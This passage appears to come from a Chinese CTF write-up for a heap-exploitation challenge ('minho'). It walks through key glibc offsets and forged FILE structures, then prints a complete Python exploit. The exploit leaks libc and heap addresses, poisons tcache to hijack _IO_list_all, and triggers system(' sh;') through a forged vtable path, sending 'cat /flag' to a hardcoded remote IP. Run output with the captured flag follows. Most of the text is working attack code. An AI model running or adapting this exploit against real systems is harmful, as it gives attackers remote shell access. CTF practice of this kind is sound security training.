@@ -1,0 +1,562 @@
+
+## 关键字段
+
+```
+wide_data_off = 0xa0
+
+vtable_off = 0xd8
+
+wide_data_vtable_off = 0xe0
+
+
+
+_IO_wfile_overflow_ptr = libc_base + 0x2160d8
+
+_IO_list_all = libc_base + 0x21a680
+
+system = libc_base + 0x50d60
+
+```
+
+## 写入 fake FILE
+
+```
+add(2, flat_dict({
+    0x10: b"  sh;",
+    0x38: system,
+    0x68: 0x71,
+    0x70: _IO_list_all ^ (heap_base >> 12),
+}, filler=b"\x00"))
+```
+
+## 继续补齐 `wide_data` 和 `vtable`
+
+```
+add(2, flat_dict({
+    wide_data_off - 0x60: heap_base + 0x2e0 + 0xd0 - wide_data_vtable_off,
+    0xd0 - 0x60: heap_base + 0x2e0 + 0x28 - do_alloc_off,
+    vtable_off - 0x60: _IO_wfile_overflow_ptr - __overflow_off,
+}, filler=b"\x00"))
+```
+
+## 最后劫持 `_IO_list_all`
+
+```
+add(2, p64(heap_base + 0x2e0))
+```
+
+## 退出触发
+
+```
+sla(b"> ", b"4")
+```
+
+## 8. 完整 exploit
+
+### 保存为
+
+```
+exp_minho_pure.py
+```
+
+### 运行
+
+```
+python3 exp_minho_pure.py 123.57.66.184 10050 --cmd "cat /flag; echo DONE"
+```
+
+### 完整代码
+
+```
+import socket, struct, time, argparse
+
+
+
+MASK64 = (1 << 64) - 1
+
+
+
+def p64(x): return struct.pack("<Q", x & MASK64)
+
+def u64(b): return struct.unpack("<Q", b.ljust(8, b"\x00")[:8])[0]
+
+
+
+def flat_list(items):
+
+    out = b""
+
+    for x in items:
+
+        out += p64(x) if isinstance(x, int) else x
+
+    return out
+
+
+
+def flat_dict(d, filler=b"\x00"):
+
+    maxlen = 0
+
+    vals = []
+
+    for off, val in d.items():
+
+        b = p64(val) if isinstance(val, int) else val
+
+        vals.append((off, b))
+
+        maxlen = max(maxlen, off + len(b))
+
+
+
+    out = bytearray(filler[:1] * maxlen)
+
+    for off, b in vals:
+
+        out[off:off + len(b)] = b
+
+    return bytes(out)
+
+
+
+class Tube:
+
+    def __init__(self, host, port, timeout=12):
+
+        self.s = socket.create_connection((host, port), timeout=timeout)
+
+        self.s.settimeout(timeout)
+
+        self.buf = b""
+
+
+
+    def recv(self, n=4096):
+
+        if self.buf:
+
+            b = self.buf[:n]
+
+            self.buf = self.buf[n:]
+
+            return b
+
+        return self.s.recv(n)
+
+
+
+    def recvuntil(self, delim, drop=False):
+
+        while delim not in self.buf:
+
+            chunk = self.s.recv(4096)
+
+            if not chunk:
+
+                break
+
+            self.buf += chunk
+
+
+
+        idx = self.buf.find(delim)
+
+        if idx >= 0:
+
+            end = idx + len(delim)
+
+            out = self.buf[:idx if drop else end]
+
+            self.buf = self.buf[end:]
+
+            return out
+
+
+
+        out = self.buf
+
+        self.buf = b""
+
+        return out
+
+
+
+    def send(self, b):
+
+        if isinstance(b, str):
+
+            b = b.encode()
+
+        self.s.sendall(b)
+
+
+
+    def sendline(self, b):
+
+        if isinstance(b, str):
+
+            b = b.encode()
+
+        self.send(b + b"\n")
+
+
+
+    def sendafter(self, delim, b):
+
+        self.recvuntil(delim)
+
+        self.send(b)
+
+
+
+    def sendlineafter(self, delim, b):
+
+        self.recvuntil(delim)
+
+        self.sendline(b)
+
+
+
+    def clean(self, timeout=0.5):
+
+        old = self.s.gettimeout()
+
+        self.s.settimeout(timeout)
+
+        out = self.buf
+
+        self.buf = b""
+
+        while True:
+
+            try:
+
+                c = self.s.recv(4096)
+
+                if not c:
+
+                    break
+
+                out += c
+
+            except socket.timeout:
+
+                break
+
+        self.s.settimeout(old)
+
+        return out
+
+
+
+def exploit(host, port, cmd):
+
+    io = Tube(host, port)
+
+
+
+    ru = io.recvuntil
+
+    sla = io.sendlineafter
+
+    sa = io.sendafter
+
+
+
+    def add(size, content):
+
+        sla(b"> ", b"1")
+
+        sla(b"Size [1=small / 2=big]: ", str(size).encode())
+
+        sa(b"Data: ", content)
+
+
+
+    def show():
+
+        sla(b"> ", b"2")
+
+
+
+    def free():
+
+        sla(b"> ", b"3")
+
+
+
+    sla(b"> ", b"0" * 0xd58 + b"3")
+
+
+
+    add(1, b"a" * 0x48 + p64(0xd11))
+
+    sla(b"> ", b"0" * 0xfff + b"2")
+
+
+
+    free()
+
+    add(1, b"a" * 0x50)
+
+    show()
+
+    ru(b"a" * 0x50)
+
+
+
+    libc_base = u64(io.recv(6)) - 0x219ce0
+
+    print("[+] libc_base =", hex(libc_base))
+
+
+
+    free()
+
+    add(1, b"a" * 0x48 + p64(0xcf1))
+
+
+
+    free()
+
+    add(2, b"a")
+
+    free()
+
+
+
+    add(1, b"a" * 0x50)
+
+    show()
+
+    ru(b"a" * 0x50)
+
+
+
+    heap_base = u64(ru(b"\n", drop=True)) << 12
+
+    print("[+] heap_base =", hex(heap_base))
+
+
+
+    free()
+
+
+
+    add(
+
+        1,
+
+        b"a" * 0x10
+
+        + p64(0)
+
+        + p64(0x31)
+
+        + 2 * p64(heap_base + 0x2c0)
+
+        + b"a" * 0x10
+
+        + p64(0x30)
+
+        + p64(0xd00)
+
+    )
+
+    free()
+
+
+
+    add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0) + p64(0x11))
+
+    free()
+
+
+
+    add(1, b"a" * 0x10 + p64(0) + p64(0x91))
+
+    sla(b"> ", b"0" * 0xfff + b"2")
+
+
+
+    free()
+
+
+
+    add(1, flat_list([
+
+        0, 0,
+
+        0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x20,
+
+        0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x40,
+
+        0, 0x91, heap_base + 0x2c0 + 0x20, libc_base + 0x219d60,
+
+    ]))
+
+    free()
+
+
+
+    add(2, b"a")
+
+    free()
+
+
+
+    wide_data_off = 0xa0
+
+    vtable_off = 0xd8
+
+    wide_data_vtable_off = 0xe0
+
+
+
+    _IO_wfile_overflow_ptr = libc_base + 0x2160d8
+
+    __overflow_off = 0x18
+
+    do_alloc_off = 0x68
+
+
+
+    _IO_list_all = libc_base + 0x21a680
+
+    system = libc_base + 0x50d60
+
+
+
+    add(
+
+        1,
+
+        b"a" * 0x10
+
+        + p64(0)
+
+        + p64(0x71)
+
+        + p64((heap_base + 0x2d0 + 0x70) ^ (heap_base >> 12))
+
+    )
+
+    free()
+
+
+
+    add(2, flat_dict({
+
+        0x10: b"  sh;",
+
+        0x38: system,
+
+        0x68: 0x71,
+
+        0x70: _IO_list_all ^ (heap_base >> 12),
+
+    }))
+
+    free()
+
+
+
+    add(2, flat_dict({
+
+        wide_data_off - 0x60: heap_base + 0x2e0 + 0xd0 - wide_data_vtable_off,
+
+        0xd0 - 0x60: heap_base + 0x2e0 + 0x28 - do_alloc_off,
+
+        vtable_off - 0x60: _IO_wfile_overflow_ptr - __overflow_off,
+
+    }))
+
+    free()
+
+
+
+    add(2, p64(heap_base + 0x2e0))
+
+
+
+    sla(b"> ", b"4")
+
+
+
+    time.sleep(0.5)
+
+    print("[+] trigger:", repr(io.clean()))
+
+
+
+    io.sendline(cmd)
+
+
+
+    out = b""
+
+    end = time.time() + 5
+
+    while time.time() < end:
+
+        try:
+
+            chunk = io.s.recv(4096)
+
+            if not chunk:
+
+                break
+
+            out += chunk
+
+            if b"DONE" in out:
+
+                break
+
+        except socket.timeout:
+
+            break
+
+
+
+    print(out.decode("latin-1", "replace"))
+
+
+
+if __name__ == "__main__":
+
+    ap = argparse.ArgumentParser()
+
+    ap.add_argument("host", nargs="?", default="123.57.66.184")
+
+    ap.add_argument("port", nargs="?", type=int, default=10050)
+
+    ap.add_argument("--cmd", default="cat /flag; echo DONE")
+
+    args = ap.parse_args()
+
+
+
+    exploit(args.host, args.port, args.cmd.encode())
+```
+
+## 9. 结果
+
+### 执行
+
+```
+python3 exp_minho_pure.py 123.57.66.184 10050 --cmd "cat /flag; echo DONE"
+```
+
+### 输出
+
+```
+[+] libc_base = 0x...
+[+] heap_base = 0x...
+[+] trigger: b'[+] Bye!\n'
+flag{bcddada9-b211-4c5d-8d04-282a53b2caff}
+DONE
+```
+
+[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
